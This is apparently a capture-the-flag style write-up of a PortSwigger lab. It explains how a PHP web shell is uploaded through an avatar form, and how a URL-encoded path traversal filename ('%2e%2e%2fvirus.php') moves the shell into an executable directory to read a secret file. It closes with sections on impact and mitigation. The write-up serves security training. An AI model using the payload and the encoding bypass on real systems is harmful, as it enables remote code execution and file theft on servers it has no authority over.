# Web Shell Upload via Path Traversal

## 📌 Lab Overview

This lab demonstrates a **File Upload Vulnerability combined with Path Traversal**.

The application allowed users to upload avatar images. Although PHP files could be uploaded, the upload directory prevented PHP execution.

However, the application failed to properly sanitize file names, making it possible to use **path traversal sequences** to place a malicious PHP file outside the restricted upload directory and into a location where PHP execution was allowed.

This lab focused on:

- File Upload Vulnerabilities
- Path Traversal Attacks
- Web Shell Uploads
- Upload Directory Restrictions
- Filter Bypass Techniques
- Remote Code Execution (RCE)

---

# 🔍 What is Path Traversal?

Path Traversal occurs when an application allows user-controlled file paths without proper validation.

Attackers can use special sequences such as:

```text
../
```

to move outside the intended directory.

Example:

```text
avatars/profile.jpg
```

Using traversal:

```text
../profile.jpg
```

becomes:

```text
avatars/../profile.jpg
```

which resolves to:

```text
profile.jpg
```

one directory higher.

This can allow attackers to:

- Read sensitive files
- Overwrite files
- Place files in unexpected locations
- Bypass security controls

---

# ⚠ Why Was the Upload Directory Safe Initially?

The application stored uploaded avatars in:

```text
/files/avatars/
```

The server was configured to treat this directory as:

```text
Static Files Only
```

meaning:

```text
virus.php
```

was displayed as a file rather than executed as PHP code.

As a result:

```text
/files/avatars/virus.php
```

returned a blank page instead of executing the payload.

---

# 🎯 Objective

The goal of this lab was to:

- Upload a malicious PHP web shell
- Bypass the upload directory restrictions
- Execute PHP code
- Retrieve Carlos's secret
- Solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(1).png?raw=true)

The application initially displayed:

- A normal webpage
- A **My Account** button

---

## Screenshot 2 — Login Page

![Screenshot 2](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(2).png?raw=true)

After clicking **My Account**, I reached the login page.

The lab provided credentials:

```text
Username: wiener
Password: peter
```

I entered them and logged in.

---

## Screenshot 3 — Upload Functionality

![Screenshot 3](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(3).png?raw=true)

After logging in as:

```text
wiener
```

I could see:

- Update Email functionality
- Avatar upload functionality

I selected:

```text
luffy.jpg
```

and uploaded it.

---

## Screenshot 4 — Successful Image Upload

![Screenshot 4](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(4).png?raw=true)

The application responded:

```text
The file avatars/luffy.jpg has been uploaded.
```

indicating successful upload.

---

## Screenshot 5 — Finding the Upload Path

![Screenshot 5](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(5).png?raw=true)

After returning to **My Account**, the uploaded image appeared correctly.

I opened the image in a new tab and discovered its location:

```text
/files/avatars/luffy.jpg
```

This revealed where uploaded files were stored.

---

## Screenshot 6 — Uploading a PHP Web Shell

![Screenshot 6](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(6).png?raw=true)

Next, I uploaded:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

saved as:

```text
virus.php
```

The payload simply reads Carlos's secret file and displays it.

---

## Screenshot 7 — PHP Upload Accepted

![Screenshot 7](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(7).png?raw=true)

The application responded:

```text
The file avatars/virus.php has been uploaded.
```

showing that PHP files were allowed.

---

## Screenshot 8 — PHP Not Executing

![Screenshot 8](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(8).png?raw=true)

After opening:

```text
/files/avatars/virus.php
```

the page was blank.

This revealed an important detail:

```text
PHP Upload Allowed
≠
PHP Execution Allowed
```

The server stored the file but did not execute PHP code inside the avatar directory.

---

## Screenshot 9 — Attempting Path Traversal

![Screenshot 9](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(9).png?raw=true)

I captured the upload request:

```http
POST /my-account/avatar
```

and modified:

```http
Content-Disposition: form-data;
name="avatar";
filename="../virus.php"
```

Payload:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

### Why Use `../`?

My reasoning was:

```text
/files/avatars/virus.php
```

did not execute PHP.

Therefore I wanted to move the file outside:

```text
avatars/
```

and place it into a parent directory where PHP execution might be enabled.

The traversal sequence:

```text
../
```

means:

```text
Go One Directory Up
```

So:

```text
avatars/../virus.php
```

would resolve to:

```text
virus.php
```

outside the avatars folder.

The server responded:

```http
200 OK
```

but the attack did not yet work.

---

## Screenshot 10 — Verifying the Upload

![Screenshot 10](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(10).png?raw=true)

Using Burp's:

```text
Show Response in Browser
```

feature, I verified the upload response.

The server still claimed:

```text
The file avatars/virus.php has been uploaded.
```

---

## Screenshot 11 — File Not Found

![Screenshot 11](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(11).png?raw=true)

After returning to the avatar page and opening the image in a new tab, I received:

```text
Not Found
The requested URL was not found on this server.
```

### Why Did This Happen?

The application likely sanitized or normalized:

```text
../
```

before saving the file.

Possible behavior:

```text
../ removed
```

or

```text
Traversal blocked
```

As a result:

```text
virus.php
```

was not written where expected.

Therefore the requested file could not be found.

---

## Screenshot 12 — Encoding the Traversal Sequence

![Screenshot 12](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(12).png?raw=true)

I modified the filename again:

```http
filename="%2e%2e%2fvirus.php"
```

Encoded values:

```text
%2e = .
%2f = /
```

Decoded:

```text
../virus.php
```

The server responded:

```http
200 OK
```

with:

```text
The file avatars/../virus.php has been uploaded.
```

### Why Did This Work?

The application was filtering:

```text
../
```

directly.

However it failed to detect:

```text
%2e%2e%2f
```

During processing:

```text
Filter Check
↓
Passes Validation
↓
URL Decoding Happens Later
↓
../ Restored
↓
File Written Outside avatars/
```

This is a classic:

```text
Path Traversal Filter Bypass
```

---

## Screenshot 13 — Confirming the Upload

![Screenshot 13](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(13).png?raw=true)

Again using:

```text
Show Response in Browser
```

I verified the upload response.

The server now acknowledged:

```text
avatars/../virus.php
```

as the uploaded location.

---

## Screenshot 14 — Accessing the Executable PHP File

![Screenshot 14](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(14).png?raw=true)

I manually navigated to:

```text
https://LAB-ID.web-security-academy.net/files/virus.php
```

and the secret appeared:

```text
czixo6LEeRfUXuH4Rs1KPY4vGFXRmdR9
```

### Why Did This URL Work?

The traversal attack moved the file from:

```text
/files/avatars/virus.php
```

to:

```text
/files/virus.php
```

The avatars directory had restrictions:

```text
No PHP Execution
```

but the parent directory:

```text
/files/
```

allowed PHP execution.

Therefore:

```text
/files/avatars/virus.php
```

→ PHP blocked

while:

```text
/files/virus.php
```

→ PHP executed successfully

This resulted in Remote Code Execution.

---

## Screenshot 15 — Solving the Lab

![Screenshot 15](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/file%20upload%20vulnerabilities/Web%20Shell%20Upload%20via%20Path%20Traversal/screenshots/lab3(15).png?raw=true)

I copied the secret and submitted it through the lab banner.

The lab was successfully solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because:

- User-controlled filenames were trusted
- Path traversal sequences were not properly sanitized
- URL-encoded traversal bypassed filtering
- Uploaded files could be placed outside intended directories
- PHP execution restrictions only existed in the avatars folder

The combination of these weaknesses allowed a malicious PHP file to execute.

---

# 💥 Impact

An attacker could potentially:

- Achieve Remote Code Execution
- Upload Web Shells
- Read sensitive server files
- Modify server-side data
- Gain full application compromise
- Establish persistent access

---

# 🛡 Mitigation

To prevent this vulnerability:

- Sanitize uploaded filenames
- Remove traversal sequences (`../`)
- Canonicalize paths before validation
- Generate server-side filenames
- Store uploads outside the web root
- Disable execution in upload directories
- Validate file extensions and MIME types
- Implement strict allowlists

---

# 🧠 Skills Learned

- File Upload Vulnerabilities
- Path Traversal Attacks
- URL Encoding Bypass Techniques
- Web Shell Uploads
- Remote Code Execution
- Upload Directory Analysis
- Burp Suite Request Manipulation

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Browser Developer Tools
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how a seemingly safe upload mechanism can become vulnerable when path traversal flaws are introduced.

By analyzing the upload behavior, identifying that PHP execution was blocked only inside the avatars directory, and bypassing traversal filtering using URL-encoded path traversal sequences, I successfully moved a malicious PHP file into an executable directory.

Through this lab, I learned:

- How path traversal impacts file uploads
- Why upload directories should never trust filenames
- How URL encoding bypasses weak filters
- How attackers combine traversal and file upload vulnerabilities to achieve RCE

The lab was successfully solved by exploiting a path traversal vulnerability to place and execute a PHP web shell outside the restricted upload directory.
